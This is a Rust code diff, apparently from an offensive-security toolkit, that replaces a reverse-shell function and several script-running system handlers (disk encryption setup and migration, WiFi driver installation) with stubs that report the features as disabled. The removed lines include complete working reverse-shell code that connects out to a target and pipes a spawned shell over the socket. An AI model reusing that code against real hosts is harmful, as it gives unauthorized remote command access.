@@ -2841,42 +2841,8 @@ fn spawn_reverse_shell(
     shell: &str,
     source_ip: Ipv4Addr,
 ) -> Result<u32> {
-    let addr = resolve_target_ipv4(target, port)?;
-    let mut stream = connect_tcp_with_source(addr, Some(source_ip), Duration::from_secs(10))
-        .with_context(|| format!("connecting to {}:{} from {}", target, port, source_ip))?;
-    stream.set_nodelay(true).ok();
-
-    let (program, args) = parse_shell_command(shell)?;
-    let arg_refs: Vec<&str> = args.iter().map(|arg| arg.as_str()).collect();
-    let mut child =
-        crate::external_tools::system_shell::spawn_piped(&program, &arg_refs)?;
-
-    let pid = child.id();
-    let mut child_stdin = child.stdin.take().context("opening shell stdin")?;
-    let mut child_stdout = child.stdout.take().context("opening shell stdout")?;
-    let mut child_stderr = child.stderr.take().context("opening shell stderr")?;
-
-    let mut stream_in = stream
-        .try_clone()
-        .context("cloning stream for stdin")?;
-    let mut stream_out = stream
-        .try_clone()
-        .context("cloning stream for stdout")?;
-
-    std::thread::spawn(move || {
-        let _ = std::io::copy(&mut stream_in, &mut child_stdin);
-    });
-    std::thread::spawn(move || {
-        let _ = std::io::copy(&mut child_stdout, &mut stream_out);
-    });
-    std::thread::spawn(move || {
-        let _ = std::io::copy(&mut child_stderr, &mut stream);
-    });
-    std::thread::spawn(move || {
-        let _ = child.wait();
-    });
-
-    Ok(pid)
+    let _ = (target, port, shell, source_ip);
+    bail!("reverse shell disabled (external shell spawn removed)")
 }
 
 #[cfg(not(feature = "external_tools"))]
@@ -3277,43 +3243,8 @@ fn handle_system_configure_host(args: SystemConfigureHostArgs) -> Result<Handler
 }
 
 #[cfg(feature = "external_tools")]
-fn handle_system_fde_prepare(root: &Path, args: SystemFdePrepareArgs) -> Result<HandlerResult> {
-    let SystemFdePrepareArgs { device } = args;
-    if !device.starts_with("/dev/") {
-        bail!("Device must be a block path like /dev/sda");
-    }
-
-    let script = root.join("scripts").join("fde_prepare_usb.sh");
-    if !script.exists() {
-        bail!("FDE prep script missing at {}", script.display());
-    }
-    let script_str = script
-        .to_str()
-        .ok_or_else(|| anyhow!("FDE prep script path must be valid UTF-8"))?;
-    let output = crate::external_tools::system_shell::run_allow_failure(
-        "bash",
-        &[script_str, device.as_str()],
-    )
-    .with_context(|| format!("running {}", script.display()))?;
-
-    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-
-    if !output.status.success() {
-        let msg = if !stderr.trim().is_empty() {
-            stderr.trim().to_string()
-        } else {
-            format!("fde prepare failed with status {:?}", output.status.code())
-        };
-        bail!(msg);
-    }
-
-    let data = json!({
-        "device": device,
-        "stdout": stdout,
-        "stderr": stderr,
-    });
-    Ok(("FDE USB prepared".to_string(), data))
+fn handle_system_fde_prepare(_root: &Path, _args: SystemFdePrepareArgs) -> Result<HandlerResult> {
+    bail!("FDE prepare disabled (external scripts removed; no Rust implementation yet)")
 }
 
 #[cfg(not(feature = "external_tools"))]
@@ -3322,68 +3253,8 @@ fn handle_system_fde_prepare(_root: &Path, _args: SystemFdePrepareArgs) -> Resul
 }
 
 #[cfg(feature = "external_tools")]
-fn handle_system_fde_migrate(root: &Path, args: SystemFdeMigrateArgs) -> Result<HandlerResult> {
-    let SystemFdeMigrateArgs {
-        target,
-        keyfile,
-        execute,
-    } = args;
-
-    if !target.starts_with("/dev/") {
-        bail!("Target must be a block path like /dev/mmcblk0p3");
-    }
-    if keyfile.is_empty() {
-        bail!("Keyfile path is required");
-    }
-    let script = root.join("scripts").join("fde_migrate_root.sh");
-    if !script.exists() {
-        bail!("FDE migrate script missing at {}", script.display());
-    }
-    let script_str = script
-        .to_str()
-        .ok_or_else(|| anyhow!("FDE migrate script path must be valid UTF-8"))?;
-    let mut args = vec![
-        script_str.to_string(),
-        "--target".to_string(),
-        target.clone(),
-        "--keyfile".to_string(),
-        keyfile.clone(),
-    ];
-    if execute {
-        args.push("--execute".to_string());
-    }
-    let arg_refs: Vec<&str> = args.iter().map(|arg| arg.as_str()).collect();
-    let output =
-        crate::external_tools::system_shell::run_allow_failure("bash", &arg_refs)
-            .with_context(|| format!("running {}", script.display()))?;
-
-    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-
-    if !output.status.success() {
-        let msg = if !stderr.trim().is_empty() {
-            stderr.trim().to_string()
-        } else {
-            format!("fde migrate failed with status {:?}", output.status.code())
-        };
-        bail!(msg);
-    }
-
-    let data = json!({
-        "target": target,
-        "keyfile": keyfile,
-        "execute": execute,
-        "stdout": stdout,
-        "stderr": stderr,
-    });
-    Ok((
-        if execute {
-            "FDE migration completed".to_string()
-        } else {
-            "FDE migration dry-run completed".to_string()
-        },
-        data,
-    ))
+fn handle_system_fde_migrate(_root: &Path, _args: SystemFdeMigrateArgs) -> Result<HandlerResult> {
+    bail!("FDE migrate disabled (external scripts removed; no Rust implementation yet)")
 }
 
 #[cfg(not(feature = "external_tools"))]
@@ -3468,47 +3339,8 @@ fn handle_system_purge(_root: &Path) -> Result<HandlerResult> {
 }
 
 #[cfg(feature = "external_tools")]
-fn handle_system_install_wifi_drivers(root: &Path) -> Result<HandlerResult> {
-    let script = root.join("scripts").join("wifi_driver_installer.sh");
-    if !script.exists() {
-        bail!("Installer script missing at {}", script.display());
-    }
-    let script_str = script
-        .to_str()
-        .ok_or_else(|| anyhow!("Installer script path must be valid UTF-8"))?;
-    let root_str = root
-        .to_str()
-        .ok_or_else(|| anyhow!("Root path must be valid UTF-8"))?;
-    let output = crate::external_tools::system_shell::run_with_env_allow_failure(
-        "bash",
-        &[script_str],
-        &[("RUSTYJACK_ROOT", root_str)],
-    )
-    .with_context(|| format!("running {}", script.display()))?;
-
-    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-
-    let result_path = Path::new("/tmp/rustyjack_wifi_result.json");
-    let mut data = if let Ok(contents) = fs::read_to_string(result_path) {
-        serde_json::from_str::<Value>(&contents).unwrap_or_else(|_| json!({ "raw": contents }))
-    } else {
-        json!({})
-    };
-
-    if let Value::Object(ref mut map) = data {
-        map.insert("exit_code".into(), json!(output.status.code()));
-        map.insert("stdout".into(), json!(stdout));
-        map.insert("stderr".into(), json!(stderr));
-    }
-
-    let message = if output.status.success() {
-        "WiFi driver installer completed"
-    } else {
-        "WiFi driver installer exited with errors"
-    };
-
-    Ok((message.to_string(), data))
+fn handle_system_install_wifi_drivers(_root: &Path) -> Result<HandlerResult> {
+    bail!("WiFi driver install disabled (external scripts removed; no Rust implementation yet)")
 }
 
 #[cfg(not(feature = "external_tools"))]
